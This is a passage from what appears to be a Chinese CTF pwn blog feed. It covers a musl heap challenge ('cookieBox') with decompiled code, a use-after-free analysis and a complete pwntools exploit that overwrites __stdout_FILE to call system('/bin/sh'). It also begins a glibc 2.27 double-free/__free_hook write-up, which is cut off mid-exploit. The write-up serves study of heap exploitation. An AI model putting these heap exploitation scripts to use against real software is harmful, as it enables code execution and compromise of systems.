class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_400A50</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the size:&quot;</span>);</span><br><span class="line">  *size = input_number();<span class="comment">// 输入大小</span></span><br><span class="line">  <span class="keyword">if</span> ( size[<span class="number">0</span>] &gt; <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *&amp;size[<span class="number">1</span>] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);<span class="comment">// 分配内存</span></span><br><span class="line">  <span class="keyword">if</span> ( !*&amp;size[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the Content:&quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, *&amp;size[<span class="number">1</span>], size[<span class="number">0</span>]);<span class="comment">// 往堆内存读取数据</span></span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )<span class="comment">// 遍历 bss 段</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;buf)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )<span class="comment">// 寻找空的内存用于存储堆指针</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = *(&amp;nbytes + i);</span><br><span class="line">      <span class="keyword">if</span> ( !result )<span class="comment">// 寻找空的内存用于存储堆大小</span></span><br><span class="line">      &#123;</span><br><span class="line">        (&amp;buf)[i] = *&amp;size[<span class="number">1</span>];<span class="comment">// 只有找到两个 index 相同为空才进行设置</span></span><br><span class="line">        *(&amp;nbytes + i) = size[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400B69</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !(&amp;buf)[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((&amp;buf)[v1]);<span class="comment">// UAF</span></span><br><span class="line">  *(&amp;nbytes + v1) = <span class="number">0</span>;<span class="comment">// 只清空 bss 上相应的堆 size，而未清空对应指针</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EDIT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400C59</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; (&amp;buf)[v1] &amp;&amp; *(&amp;nbytes + v1) )<span class="comment">// 检查 bss 上对应的堆指针和堆 size</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input the content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (&amp;buf)[v1], *(&amp;nbytes + v1));<span class="comment">// 根据 bss 上堆 size 读取数据</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br></pre></td></tr></table></figure><p>SHOW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400BE1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !(&amp;buf)[v1] || !*(&amp;nbytes + v1) )<span class="comment">// 同样会检测堆指针和堆 size</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((&amp;buf)[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>调试命令：<code>p/x mal</code>可以查看 mal 堆管理器。</p><ol><li><p>由于静态堆内存初试化后，打开 gdb调试发现，bin 中已有一些 chunk（一个在程序段上，一个在libc上），且 idx &gt; 32，不知为何需要申请 4 次才能申请完（不应该是 2 次吗？不过对做题没有影响）。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041212424.png" alt="image-20230904121226225" style="zoom:67%;" /></li><li><p>由于静态堆初始化，因此很容易就可以泄露出 libc 基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br></pre></td></tr></table></figure></li><li><p>利用 uaf 实现两个指针指向同一个堆（目标堆），一个用于 free，一个用于 edit，</p><p>再释放一个堆使得目标堆和该堆处于同一 bin 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>修改目标堆的 next 指针指向 __stdout_FILE，</p><p>修改其 prev 指针指向目标地址 addr-0x10,</p><p>再申请一个堆，达到 attack，向 addr 中写入__stdout_FILE，</p><p>这里的 addr 即为 bss 上的 idx2 对应的堆指针。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602070</span>-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure></li><li><p>修改目标堆指针，即修改 __stdout_FILE 结构体，通过 puts 触发链子，打其他 FILE 链子的时候可能需要保证 <code>wpos != wbase</code>。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041226665.png" alt="image-20230904122654594" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure></li></ol><p>还有一种解题思路就是在 attack 时改 addr 为 mal 上的对应的 bin结构体，修改其 head，也能申请到对应内存。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./cookieBox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the size:\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;__stdout_FILE&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">mal = libc_base + <span class="number">0x292ac0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;除了学习 glibc 的堆管理机制外，musl 也开始提上行程。&lt;/p&gt;
&lt;p&gt;由于以前总是用模板思路做题，很多东西总是浮于表面，不能很好地系统性理解。因此有了回炉重造的想法，希望能从根本上理解堆管理的机制。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>高版本堆块利用练习</title>
    <link href="http://example.com/2023/08/26/heap/"/>
    <id>http://example.com/2023/08/26/heap/</id>
    <published>2023-08-26T07:11:39.000Z</published>
    <updated>2023-09-26T03:37:34.345Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些堆题的练习。</p><span id="more"></span><h2 id="gdb调试命令"><a href="#gdb调试命令" class="headerlink" title="gdb调试命令"></a>gdb调试命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p *_IO_list_all</span><br><span class="line">p *(struct _IO_FILE_plus *)addr</span><br><span class="line">p *(struct _IO_wide_data *)addr</span><br><span class="line">p *(const struct _IO_jump_t *)addr</span><br></pre></td></tr></table></figure><h2 id="libc2-27"><a href="#libc2-27" class="headerlink" title="libc2.27"></a>libc2.27</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>引入了<code>tcache</code>堆管理机制，<code>__free_hook</code>和<code>__malloc_hook</code>都还在，通过<code>bk</code>指针检测是否存在<code>double free</code>。</p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>例题信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">来源：zjctf2022省赛初赛-babyheap</span><br><span class="line">libc版本：ubuntu2.27-3-1.6</span><br><span class="line">漏洞：UAF</span><br><span class="line">限制：堆块大小 &lt;= 0x7f</span><br><span class="line">     add次数 &lt;= 7</span><br></pre></td></tr></table></figure><p>MENU：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. add note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. delete note&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;input your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ADD：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span> &amp;&amp; heap[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;full note&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input size: &quot;</span>);</span><br><span class="line">  v2 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect size&quot;</span>);</span><br><span class="line">  heap[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  heap_size[i] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EDIT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index: &quot;</span>);</span><br><span class="line">  v1 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">6</span> || !heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect idx&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, heap[v1], heap_size[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SHOW：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index: &quot;</span>);</span><br><span class="line">  v1 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">6</span> || !heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect idx&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(heap[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETE：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index: &quot;</span>);</span><br><span class="line">  v0 = input_num();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">6</span> || !heap[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect idx&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(heap[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路1，也是EXP的思路"><a href="#思路1，也是EXP的思路" class="headerlink" title="思路1，也是EXP的思路"></a>思路1，也是EXP的思路</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 构造double free，泄露出heap_base的地址</span><br><span class="line">2. 利用double free，申请到tcache bin，填满0x80的数量</span><br><span class="line">3. 释放堆块至unsorted bin，拿到libc_base</span><br><span class="line">4. 再次构造double free，劫持__free_hook</span><br></pre></td></tr></table></figure><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input size: \n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input index: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input content: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span 